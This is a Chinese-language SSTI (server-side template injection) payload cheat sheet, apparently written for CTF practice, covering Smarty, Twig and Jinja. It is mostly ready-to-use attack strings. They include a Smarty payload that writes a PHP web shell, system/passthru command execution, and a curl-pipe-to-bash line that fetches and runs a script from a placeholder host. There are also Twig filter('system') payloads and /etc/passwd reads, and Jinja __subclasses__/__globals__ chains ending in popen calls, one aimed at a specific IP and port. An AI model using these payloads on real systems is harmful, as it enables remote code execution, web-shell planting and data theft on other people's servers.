
SSTI，即**服务端模板注入**，起因是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，从而导致各种各样的问题，与sql注入类似

## Smarty模板

获取smarty版本号：

```
{$smarty.version}
```


执行php代码

```
{php}echo `id`;{/php} //注意这个在3.x版本的时候就已经废弃了
```

getshell

```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']);?>",self::clearConfig())}
```


RCE

```
{system('ls')}

{if show_source('/flag')}{/if}

{if passthru(“tac fl*”)}{/if}

反弹shell:
{system('curl http://xxx:xxxx/dev.txt|bash')}
```

## twig注入

基础注入：

```
{{7*7}}

{{7*'7'}}

{{dump(app)}}

{{app.request.server.all | join(',')}}
```

任意文件读取：

```
{{'/etc/passwd'|file_excerpt(1,30)}}
```



RCE：

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['id'] | filter('system')}}

{{['cat\x20/etc/passwd'] | filter('system')}}

{{['cat$IFS/etc/passwd'] | filter('system')}}
```

如果有FILTER_VALIDATE_EMAIL时：

```
email = "{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@xx.com
```

## Jinja

检测：{{7*7}}

常用方法

```
__class__ 来获取对象的类（类型）信息
__subclasses__() 用于获取一个类的所有直接子类
__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析
__base__ __mro__ 返回该对象所继承的基类 
__init__ 类的初始化方法 
__globals__ 对包含函数全局变量的字典的引用
__str__ 调用内置函数 str() 或使用 print() 函数来打印对象时，Python 将查找对象的 __str__ 方法，以获取对象的字符串表示
```

```
{%%}可以用来声明变量，当然也可以用于循环语句和条件语句。  
{{}}用于将表达式打印到模板输出  
{##}表示未包含在模板输出中的注释  
##可以有和{%%}相同的效果
```

找到父类`<type 'object'>`-->寻找子类-->找关于命令执行或者文件操作的模块

**获取字符串的类对象**

```
''.__class__ 

<type 'str'>
```

**寻找基类**

```
''.__class__.__mro__ 
             __base__

(<type 'str'>, <type 'basestring'>, <type 'object'>)
```

**寻找可用引用**

```
''.__class__.__mro__[2].__subclasses__() 

import re

str='''[<type 'type'>,......'''
result=re.findall('<class.*?>',str)
for i in range(len(result)):
    if 'os' in result[i]:
        print(result[i])
        print(i)
```

**找到并利用**

```
type file类型(可以进行文件读取)

<class ‘site._Printer’>类型（可以进行命令执行）
<class 'os._wrap_close'>
<class 'subprocess.Popen'>


使用方法：
<class 'os._wrap_close'>.__init__.__globals__['popen']('dir').read() 

<class 'os._wrap_close'>.__init__.__globals__['os']('dir').read() 


<class 'subprocess.Popen'>.('ls',shell=True,stdout=-1).communicate()
```

**构造最终payload**

```
/?name={{%27%27.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('dir').read()}}

http://61.147.171.105:62525/{{config.__class__.__init__.__globals__['os'].popen('cat%20fl4g').read()}}

passhash.__str__.__globals__[app].wsgi_app.__globals__[os].environ
```

